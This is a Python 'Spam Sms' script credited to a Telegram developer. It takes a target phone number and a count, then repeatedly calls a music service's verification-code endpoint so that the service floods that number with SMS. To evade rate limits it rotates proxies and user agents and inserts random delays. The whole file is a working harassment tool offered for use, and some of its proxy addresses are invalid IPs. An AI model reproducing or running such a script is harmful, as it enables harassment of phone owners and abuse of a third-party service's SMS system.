
import requests
import json
import random
import time
from pyfiglet import Figlet
from termcolor import colored
from datetime import datetime


RESET_COLOR = "\033[0m"
YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"


f = Figlet(font='slant')
print(f"{YELLOW}{f.renderText('Spam Sms')}{RESET_COLOR}")
v = ("-" * 20)
dev = ("𝑫𝒆𝒗 : @A_Y_TR")
de = ('Dev: tele: @A_Y_TR')
print(dev)
proxies = [
    {"http": "http://123.456.789.0:8080"},
    {"http": "http://98.765.432.1:3128"},
    {"http": "http://192.168.0.1:1080"},
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://49.12.235.70:80'},
    {'http': 'http://49.13.173.87:80'},
    {'http': 'http://116.202.121.34:3128'},
    {"socks4": "socks4://148.72.215.230:55327"},
    {"http": "http://123.456.789.0:8080"},
    {"http": "http://98.765.432.1:3128"},
    {"http": "http://192.168.0.1:1080"},
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://49.12.235.70:80'},
    {'http': 'http://49.13.173.87:80'},
    {'http': 'http://116.202.121.34:3128'},
    {'http': 'http://3.71.96.137:8090'},
    {"socks4": "socks4://148.72.215.230:55327"},
    {"socks4": "socks4://37.59.213.49:56887"},
    {"socks4": "socks4://200.46.30.210:4153"}
]


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; U; Android 8.1.0) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
]



print("\033[1;37m")
number = input("Enter Your Number: ")

print("\033[1;37m")
sms = input("Enter number of messages: ")
print("\033[1;31m")
print(v * 3)
url = "https://api.twistmena.com/music/Dlogin/sendCode"

payload = json.dumps({
    "dial": f"2{number}"
})

# متغيرات لحساب النتائج
success_count = 0
failure_count = 0

for i in range(int(sms)):
    proxy = random.choice(proxies)  
    user_agent = random.choice(user_agents)  #آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم 
        
    headers = {
        'User-Agent': user_agent,
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'tgdeviceid': "",
        'app_version': "10.10.10",
        'device_token': "",
        'appversion': "10.10.10",
        'channel': "mobileapp",
        'access-token': "",
        'platform': "android",
        'tg-token': "",
        'accept-language': "ar",
        'tg-refresh-token': "",
    }

    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
        status = response.json()["responseHeader"]['status']
        print(f"{GREEN}SUCCESS: {status}{RESET_COLOR}")
        success_count += 1  # زيادة عدد الرسائل الناجحة
    except Exception as e:
        print(f"{RED}Request failed: {e}{RESET_COLOR}")
        failure_count += 1  # زيادة عدد الرسائل الفاشلة

    time.sleep(random.uniform(1, 2))  # تأخير عشوائي بين الطلبات
fal = ("=" * 20)
# طباعة عدد الرسائل الناجحة والفاشلة
print("\033[1;31m")
print(v * 3)
print("\033[1;31m")
print(f"{CYAN}Total successful requests: {success_count}{RESET_COLOR}")
print(v * 3)
print(f"{RED}Total failed requests: {failure_count}{RESET_COLOR}")
print(fal * 3)
import rich
f = Figlet(font='small')
print(colored(f.renderText("by spider"), 'white', 'on_blue', ))
